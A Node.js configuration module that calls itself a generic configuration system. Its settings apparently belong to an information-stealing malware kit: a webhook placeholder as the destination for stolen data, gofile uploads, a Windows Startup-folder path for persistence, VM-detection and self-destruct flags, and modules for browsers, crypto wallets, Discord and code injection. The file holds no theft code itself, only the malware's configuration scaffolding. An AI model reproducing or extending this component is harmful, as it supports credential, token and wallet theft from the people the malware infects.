/**
 * Configuration Management System
 * Handles all application configuration with environment-based settings
 */

const path = require('path');
const fs = require('fs');

class Config {
    constructor() {
        this.config = {
            // Application settings
            app: {
                name: process.env.APP_NAME || 'client',
                version: process.env.APP_VERSION || '1.0.0',
                environment: process.env.NODE_ENV || 'development'
            },
            
            // Webhook configuration
            webhook: {
                url: process.env.WEBHOOK_URL || '%WEBHOOK%',
                timeout: parseInt(process.env.WEBHOOK_TIMEOUT) || 30000
            },
            
            // File paths
            paths: {
                temp: process.env.TEMP_PATH || path.join(process.env.LOCALAPPDATA || '/tmp', 'Temp'),
                startup: process.env.STARTUP_PATH || path.join(process.env.APPDATA || '/tmp', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
                output: process.env.OUTPUT_PATH || './output'
            },
            
            // Upload settings
            upload: {
                maxSize: parseInt(process.env.MAX_UPLOAD_SIZE) || 7 * 1024 * 1024, // 7MB
                service: process.env.UPLOAD_SERVICE || 'gofile'
            },
            
            // Security settings
            security: {
                enableVmDetection: process.env.ENABLE_VM_DETECTION === 'true',
                enableSelfDestruct: process.env.ENABLE_SELF_DESTRUCT === 'true'
            },
            
            // Module settings
            modules: {
                enabled: {
                    browsers: process.env.ENABLE_BROWSERS !== 'false',
                    crypto: process.env.ENABLE_CRYPTO !== 'false',
                    files: process.env.ENABLE_FILES !== 'false',
                    discord: process.env.ENABLE_DISCORD !== 'false',
                    system: process.env.ENABLE_SYSTEM !== 'false',
                    injection: process.env.ENABLE_INJECTION !== 'false'
                }
            }
        };
    }

    /**
     * Get configuration value by path
     * @param {string} path - Dot notation path to config value
     * @param {*} defaultValue - Default value if path not found
     * @returns {*} Configuration value
     */
    get(path, defaultValue = null) {
        const keys = path.split('.');
        let value = this.config;
        
        for (const key of keys) {
            if (value && typeof value === 'object' && key in value) {
                value = value[key];
            } else {
                return defaultValue;
            }
        }
        
        return value;
    }

    /**
     * Set configuration value by path
     * @param {string} path - Dot notation path to config value
     * @param {*} value - Value to set
     */
    set(path, value) {
        const keys = path.split('.');
        const lastKey = keys.pop();
        let current = this.config;
        
        for (const key of keys) {
            if (!(key in current) || typeof current[key] !== 'object') {
                current[key] = {};
            }
            current = current[key];
        }
        
        current[lastKey] = value;
    }

    /**
     * Load configuration from file
     * @param {string} filePath - Path to configuration file
     */
    loadFromFile(filePath) {
        try {
            if (fs.existsSync(filePath)) {
                const fileConfig = JSON.parse(fs.readFileSync(filePath, 'utf8'));
                this.config = { ...this.config, ...fileConfig };
            }
        } catch (error) {
            console.warn(`Failed to load config from ${filePath}:`, error.message);
        }
    }

    /**
     * Save configuration to file
     * @param {string} filePath - Path to save configuration
     */
    saveToFile(filePath) {
        try {
            const dir = path.dirname(filePath);
            if (!fs.existsSync(dir)) {
                fs.mkdirSync(dir, { recursive: true });
            }
            fs.writeFileSync(filePath, JSON.stringify(this.config, null, 2));
        } catch (error) {
            console.error(`Failed to save config to ${filePath}:`, error.message);
        }
    }

    /**
     * Validate required configuration
     * @returns {boolean} True if configuration is valid
     */
    validate() {
        const required = [
            'app.name',
            'webhook.url',
            'paths.temp'
        ];

        for (const path of required) {
            if (this.get(path) === null) {
                console.error(`Missing required configuration: ${path}`);
                return false;
            }
        }

        return true;
    }
}

// Create and export singleton instance
const config = new Config();

// Load configuration from file if exists
config.loadFromFile('./config.json');

module.exports = config;